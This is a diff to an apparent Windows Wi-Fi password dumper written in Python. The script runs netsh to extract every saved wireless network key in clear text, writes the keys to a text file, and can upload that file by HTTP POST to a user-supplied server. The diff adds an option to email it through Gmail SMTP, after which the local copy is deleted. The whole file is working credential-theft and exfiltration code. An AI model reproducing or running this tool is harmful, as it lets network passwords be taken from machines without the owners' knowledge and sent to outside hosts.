@@ -6,19 +6,52 @@ import subprocess
 import re
 import time
 import os
-import requests
-def showit():
+import requests, getpass
+import smtplib, ssl
+
+def KeyboardInterruptError():  #When Keyboard Interupts,this function is been called
+    os.system('cls')
+    if os.path.exists('WifiPasswd.txt'):
+        os.remove('WifiPasswd.txt')
+    print("\033[31m\nExiting \n\033[00m")
+def error(): # If any Error occurs in the Program this function is been called
+    os.system('cls')
+    print("\033[31m\nSomething went wrong.Try again with proper information\033[00m")
+    os.remove('WifiPasswd.txt')
+def email(): # Function for Sending Email 
+    port = 465  # For SSL
+    smtp_server = "smtp.gmail.com"
+    sender_email =input("\033[31mMake sure to turn on the less secure app settings in Google \n\n\033[00mType Sender gmail: ")
+    password = getpass.getpass('Enter the Password :')  
+    context = ssl.create_default_context()
+    with open('WifiPasswd.txt', 'r') as file:
+        message ="\n"+file.read()
+    try:
+        with smtplib.SMTP_SSL(smtp_server, port, context=context) as server:
+            server.login(sender_email, password)
+            receiver_email =input("Type Reciever Email: ") 
+            server.sendmail(sender_email, receiver_email, message)
+        print("\033[92m\nSent to the mail\n\033[00m")
+        os.remove("WifiPasswd.txt")
+    except smtplib.SMTPAuthenticationError:
+        os.system("cls")
+        banner()
+        print("\033[31m\nWrong Username or Password\n\033[00m")
+        email()
+    except:
+        error()
+def showit(): #Prints the Stored Password
     if not password:
         print("\033[92mSSID" + " " * 7 + ":{}\nPassword".format(x) + " " * 3 + ":None\n\033[0m")
     else:
         print("\033[92mSSID" + " " * 7 + ":{}\nPassword".format(x) + " " * 3 + ":{}\n\033[0m".format(password[0]))
-def savetxt():
+def savetxt(): #Saves the Stored Password in WifiPasswd.txt
     with open("WifiPasswd.txt", 'a') as f:
         if not password:
             f.write("SSID" + " " * 7 + ":{}\nPassword".format(x) + " " * 3 + ":None\n\n")
         else:
             f.write("SSID" + " " * 7 + ":{}\nPassword".format(x) + " " * 3 + ":{}\n\n".format(password[0]))
-def PostWebserver():
+def PostWebserver(): #Function to Sending the passwrd over PHP Server
     url = input("Enter the url(Eg:http://example.com/upload.php): ")
     if url=='':
         os.system('cls')
@@ -29,10 +62,10 @@ def PostWebserver():
         r = requests.post(url, files={'uploaded_file': (f)})
         if r.status_code == 200:
             print("\033[92mUploaded Successfully\033[0m")
-def main():
+def main(): #Main Function
     global password,x
     try:
-        Ask = input("Choose the Options:\n   1.Show\n   2.SaveTxt\n   3.Post To Webserver\n   4.Exit\n>> ")
+        Ask = input("Choose the Options:\n   1.Show\n   2.SaveTxt\n   3.Post To Webserver\n   4.Send Mail\n   5.Exit\n>> ")
         cmd_profile = subprocess.getoutput("netsh wlan show profiles")
         profile = re.findall('All User Profile     : (.*)', cmd_profile)
         for x in profile:
@@ -40,11 +73,9 @@ def main():
             password = re.findall("Key Content            : (.*)", cmd_passwd)
             if (Ask == '1'):
                 showit()
-            elif (Ask == '2'):
-                savetxt()
-            elif (Ask == '3'):
-                savetxt()
-            elif (Ask == '4'):
+            elif Ask in ['2','3','4']:
+                savetxt() 
+            elif (Ask == '5'):
                 print("\n\033[92m Bye Bye !!! \n\033[00m")
                 exit()
             else:
@@ -58,20 +89,24 @@ def main():
                 try:
                     PostWebserver()
                 except KeyboardInterrupt:
-                    os.system('cls')
-                    print("\033[31m\nExiting \n\033[00m")
+                    KeyboardInterruptError()
                 except:
-                    print("Something went wrong.Try again with proper information")
-                    os.remove('WifiPasswd.txt')
+                    error()
         if Ask == '2':
             print("\033[92m\nSaved as WifiPasswd.txt\n\033[00m")
+        if Ask == '4':
+            try:
+                email()
+            except KeyboardInterrupt:
+                KeyboardInterruptError()
+            except:
+                error()
         time.sleep(2)
 
 
     except KeyboardInterrupt:
-        os.system('cls')
-        print("\033[31m\nExiting \n\033[00m")
-def banner ():
+        KeyboardInterruptError()
+def banner (): #Banner
     print(""" \033[31m
 
 888       888 888       888 8888888b.  8888888888 
@@ -89,6 +124,7 @@ def banner ():
 
 \033[00m""")
 
-os.system("cls")
-banner()
-main()
+
+os.system("cls") #Clears the Screen 
+banner() #Banner is been called
+main() #Main function is called
